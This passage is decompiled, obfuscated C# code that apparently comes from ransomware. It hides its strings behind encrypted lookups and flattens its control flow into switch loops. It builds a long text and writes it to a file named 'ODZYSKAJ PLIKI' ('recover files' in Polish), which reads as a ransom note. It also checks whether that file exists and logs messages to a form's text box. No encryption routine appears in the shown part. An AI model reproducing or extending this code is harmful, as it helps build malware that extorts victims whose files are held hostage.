						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto IL_04c4_2;
						}
						goto case 15;
					case 15:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2296));
						num = 36;
						goto IL_04c4_2;
					case 39:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2360));
						num3 = 16;
						goto IL_04c0;
					case 36:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2364));
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2296));
						num2 = 41;
						continue;
					case 8:
					case 31:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2296));
						num3 = 14;
						goto IL_04c0;
					case 33:
						if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(120))
						{
							num = 17;
							if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
							{
								goto IL_04c4_2;
							}
							goto case 20;
						}
						stringBuilder = new StringBuilder();
						num = 3;
						goto IL_04c4_2;
					case 20:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2316));
						num3 = 24;
						goto IL_04c0;
					case 19:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2296));
						num2 = 12;
						continue;
					case 11:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2304));
						num = 15;
						goto IL_04c4_2;
					case 40:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2296));
						num = 4;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto IL_04c4_2;
						}
						goto case 22;
					case 22:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2332));
						num3 = 26;
						goto IL_04c0;
					case 23:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2296));
						num2 = 22;
						continue;
					case 3:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2280));
						num3 = 27;
						goto IL_04c0;
					case 21:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2324));
						num2 = 9;
						continue;
					case 25:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2296));
						num3 = 30;
						goto IL_04c0;
					case 24:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2312));
						num = 29;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto IL_04c4_2;
						}
						goto case 6;
					case 27:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2284));
						num = 32;
						if (true)
						{
							goto IL_04c4_2;
						}
						goto case 29;
					case 29:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2320));
						num = 5;
						goto IL_04c4_2;
					case 38:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2348));
						goto case 8;
					case 13:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2304));
						num3 = 1;
						goto IL_04c0;
					case 9:
						stringBuilder.AppendLine("");
						num3 = 34;
						goto IL_04c0;
					case 18:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2356));
						num3 = 39;
						goto IL_04c0;
					case 12:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2296));
						num = 13;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto IL_04c4_2;
						}
						goto case 16;
					case 4:
						goto IL_03b4;
					case 28:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2344));
						num3 = 38;
						goto IL_04c0;
					case 0:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2296));
						num3 = 2;
						goto IL_04c0;
					case 5:
						stringBuilder.AppendLine("");
						num2 = 21;
						continue;
					case 32:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2288));
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2292));
						num = 40;
						if (0 == 0)
						{
							goto IL_04c4_2;
						}
						goto case 1;
					case 1:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2296));
						num = 37;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto IL_04c4_2;
						}
						goto case 0;
					case 30:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2340));
						num3 = 28;
						goto IL_04c0;
					case 34:
						stringBuilder.AppendLine("");
						goto case 10;
					default:
						num = 10;
						goto IL_04c4_2;
					case 14:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2352));
						num3 = 18;
						goto IL_04c0;
					case 42:
						{
							return result;
						}
						IL_04c0:
						num = num3;
						goto IL_04c4_2;
					}
					break;
					IL_03b4:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2300));
					_ = 0;
					if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						num2 = 8;
						continue;
					}
					num = 35;
					if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto IL_04c4_2;
					IL_0066:
					result = stringBuilder.ToString();
					num = 42;
					goto IL_04c4_2;
				}
				break;
			}
			goto IL_0016;
			IL_0016:
			stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2308));
			num = 6;
			goto IL_04c4;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void WriteStatusFile(string _0020, string _0020, string _0020, DateTime _0020, string _0020 = "!!$ O D Z Y S K A J   P L I K I.txt")
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		try
		{
			string arg = _0020.ToString(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2264));
			File.WriteAllText(Path.Combine(_0020, _0020), StaticText + string.Format(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2368), _0020, _0020, arg));
		}
		catch
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static bool StatusFileExist(string _0020, string _0020 = "!!$ O D Z Y S K A J   P L I K I.txt")
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return File.Exists(Path.Combine(_0020, _0020));
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
public static class _008E_0089_0087_008A_0086_008A_0088_008D_0094_008F_0088_0091_008F_008B_008F_0093_008E_008A_0095_0095_008D_0087_0089_008F_008D_008A_008E_0091_008A_0093_0093_0095_0090_008E_0089_008A
{
	private static TextBox LogViewer
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void SetLogViewer(this Form _0020, TextBox _0020)
	{
		//Discarded unreachable code: IL_0005, IL_001c
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_006a: Incompatible stack heights: 0 vs 1
		int num = 4;
		bool flag = default(bool);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num3 = num2;
				while (true)
				{
					switch (num3)
					{
					case 1:
					case 3:
						if (!flag)
						{
							goto IL_008a;
						}
						break;
					case 4:
						flag = _0020 == null;
						_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
						if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto end_IL_0029;
						}
						goto end_IL_0025;
					case 5:
						return;
					}
					throw new NullReferenceException(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2372));
					IL_008a:
					LogViewer = _0020;
					num3 = 5;
					continue;
					end_IL_0029:
					break;
				}
				num2 = 0;
				continue;
				end_IL_0025:
				break;
			}
			num = 3;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Log(string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		AppendMessage(FormatMessage(string.Empty, _0020, null));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Log(string _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		AppendMessage(FormatMessage(_0020, _0020, null));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Log(string _0020, string _0020, Exception _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		AppendMessage(FormatMessage(_0020, _0020, _0020));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Log(this Form _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		AppendMessage(FormatMessage(string.Empty, _0020, null));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Log(this Form _0020, string _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		AppendMessage(FormatMessage(_0020, _0020, null));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Log(this Form _0020, string _0020, string _0020, Exception _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		AppendMessage(FormatMessage(_0020, _0020, _0020));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static void AppendMessage(string _0020)
	{
		//Discarded unreachable code: IL_0005, IL_00e4
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 11;
		bool flag = default(bool);
		_003C_003Ec__DisplayClass11_0 _003C_003Ec__DisplayClass11_ = default(_003C_003Ec__DisplayClass11_0);
		bool invokeRequired = default(bool);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num3;
				switch (num2)
				{
				case 8:
					flag = LogViewer == null;
					num = 4;
					if (0 == 0)
					{
						break;
					}
					goto case 1;
				case 1:
					throw new NullReferenceException(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2376));
				case 10:
					return;
				case 3:
					((TextBoxBase)LogViewer).ScrollToCaret();
					num = 12;
					if (0 == 0)
					{
						break;
					}
					goto default;
				default:
					((Control)LogViewer).Invoke((Delegate)new Action(_003C_003Ec__DisplayClass11_._003CAppendMessage_003Eb__0));
					num3 = 10;
					goto IL_00e9;
				case 0:
				case 5:
					if (!invokeRequired)
					{
						TextBox logViewer = LogViewer;
						((Control)logViewer).set_Text(((Control)logViewer).get_Text() + _003C_003Ec__DisplayClass11_.message);
						num = 2;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							break;
						}
						goto case 3;
					}
					goto default;
				case 7:
					_003C_003Ec__DisplayClass11_.message = _0020;
					num2 = 8;
					continue;
				case 4:
					if (!flag)
					{
						invokeRequired = ((Control)LogViewer).get_InvokeRequired();
						_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
						num3 = ((!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()) ? 9 : 0);
						goto IL_00e9;
					}
					num2 = 1;
					continue;
				case 2:
					((TextBoxBase)LogViewer).set_SelectionStart(((Control)LogViewer).get_Text().Length);
					num = 3;
					if (true)
					{
						break;
					}
					goto case 11;
				case 11:
					_003C_003Ec__DisplayClass11_ = new _003C_003Ec__DisplayClass11_0();
					num2 = 7;
					continue;
				case 12:
					return;
					IL_00e9:
					num = num3;
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static string FormatMessage(string _0020, string _0020, Exception _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0070
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_00d8: Incompatible stack heights: 0 vs 1
		int num = 4;
		bool flag = default(bool);
		string result = default(string);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num3 = num2;
				while (true)
				{
					switch (num3)
					{
					case 5:
						goto end_IL_0079;
					case 0:
					case 2:
						_0020 = _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2380) + _0020 + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2384);
						goto end_IL_0079;
					default:
						num2 = 5;
						if (0 == 0)
						{
							break;
						}
						goto case 1;
					case 1:
					case 3:
						if (!flag)
						{
							goto end_IL_0079;
						}
						goto case 0;
					case 4:
						flag = !string.IsNullOrEmpty(_0020);
						_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
						if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto IL_00b8;
						}
						num2 = 3;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							break;
						}
						goto case 6;
					case 6:
						return result;
					}
					break;
					IL_00b8:
					num3 = 0;
				}
				continue;
				end_IL_0079:
				break;
			}
			result = string.Format(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2388), DateTime.Now, _0020.ToUpper(), _0020, _0020);
			num = 6;
		}
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
